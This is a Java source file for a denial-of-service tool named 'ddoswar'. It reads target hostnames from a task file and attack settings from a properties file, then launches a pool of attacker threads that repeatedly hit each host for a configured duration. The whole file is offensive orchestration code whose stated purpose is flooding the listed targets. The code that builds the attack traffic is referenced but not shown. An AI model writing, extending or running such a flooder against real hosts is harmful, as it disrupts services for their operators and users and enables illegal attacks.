package ua.cc.lajdev.ddoswar;

import ua.cc.lajdev.ddoswar.utils.FileParser;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Properties;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * This is the GUI and all settings for the attack will
 * be defined in this class.
 */
public class DDOSer {

    /**
     * This is is the threadpool for all the DDOS-Attack threads.
     * Every attacking thread will be saved in there.
     */
    private ScheduledExecutorService threadPool;

    /**
     * Pattern for the DDOS.
     * Is like the model for the GUI. Or a configuration.
     */
    private DDOSPattern ddosPattern;

    /**
     * Duration of the Distributed Denial of Service (in seconds).
     */
    private int duration;

    /**
     * Decides if the threads should stop.
     * false = threads shouldn´t stop
     * true = threads should stop
     */
    public static boolean stopThread = false;

    /**
     * This thread checks
     */
    private TimeChecker timeChecker;

    private String hostName;

    /**
     * Creates new form ua.cc.lajdev.ddoswar.DDOSer
     */
    public DDOSer() {
        startAll();
    }

    public DDOSer(String hostName) {
        this.hostName = hostName;
        startAll();
    }

    private int createPattern() {
        try (Scanner reader = new Scanner(new FileReader("conf/ddos.properties"))) {
            Properties properties = new Properties();
            while (reader.hasNextLine()) {
                String[] trim = reader.nextLine().split("=");
                properties.setProperty(trim[0].trim(), trim[1].trim());
            }

            ddosPattern = new DDOSPattern();
            ddosPattern.setHost(hostName);
            ddosPattern.setProtocol(properties.getProperty("protocol"));
            ddosPattern.setPort(Integer.parseInt(properties.getProperty("port")));
            int threads = Integer.parseInt(properties.getProperty("threads"));
            ddosPattern.setThreads(threads);
            ddosPattern.setMessage(properties.getProperty("message"));
            ddosPattern.setHours(Integer.parseInt(properties.getProperty("hours")));
            ddosPattern.setMinutes(Integer.parseInt(properties.getProperty("minutes")));
            ddosPattern.setSeconds(Integer.parseInt(properties.getProperty("seconds")));
            ddosPattern.setTimeout(Integer.parseInt(properties.getProperty("timeout")));
            ddosPattern.setSocketTimeout(Integer.parseInt(properties.getProperty("socketTimeout")));

            return threads;
        } catch (IOException e) {
            System.out.println(e.getCause());
        }
        return 0;
    }

    /**
     * This method is responsible for adding new
     * text to the console of the GUI. (JTextField on the bottom of the GUI)
     *
     * @param message
     */
    public static void appendToConsole(String message) {
        Date date = new Date(System.currentTimeMillis());
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
        StringBuilder sb = new StringBuilder(dateFormat.format(date));
        sb.append(" ").append(message).append("\n");
        System.out.println(sb);
    }

    /**
     * Start the whole DDOS process.
     */
    private void startAll() {
        stopThread = false;
        int threads = createPattern();
        duration = (ddosPattern.getHours() * 3600) + (ddosPattern.getMinutes() * 60) + (ddosPattern.getSeconds());
        if (duration > 0) {
            threadPool = Executors.newScheduledThreadPool(threads);
            timeChecker = new TimeChecker();
            timeChecker.start();
            for (int i = 0; i < ddosPattern.getThreads(); i++) {
                // add a new attacker thread to the threadpool
                threadPool.scheduleWithFixedDelay(DdosFactory.createDDOS(ddosPattern), 1, ddosPattern.getTimeout(), TimeUnit.MILLISECONDS);
            }
        } else {
            System.out.println("Time must be greater than 0 seconds!");
        }
    }

    /**
     * This method stops the whole DDOS process.
     */
    private void stopAll() {
        if (timeChecker != null) timeChecker.interrupt();
        stopThread = true;
        if (threadPool != null) threadPool.shutdownNow();
        threadPool = null;
    }

    /**
     * Checks if it´s time to stop all threads.
     */
    class TimeChecker extends Thread {

        @Override
        public void run() {
            while (!isInterrupted() && !stopThread && duration > 0) {
                try {
                    duration -= 1;
                    Thread.sleep(1000);
                } catch (InterruptedException ex) {
                    interrupt();
                    stopThread = true;
                    duration = 0;
                    ex.printStackTrace();
                    break;
                }
            }
            stopAll();
            System.out.println("Stopped.");
        }
    }

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        List<String> hostNames = FileParser.parse("conf/task.txt");
        System.out.println("Attacking.");
        for (String s : hostNames) {
            new DDOSer(s);
        }
    }
}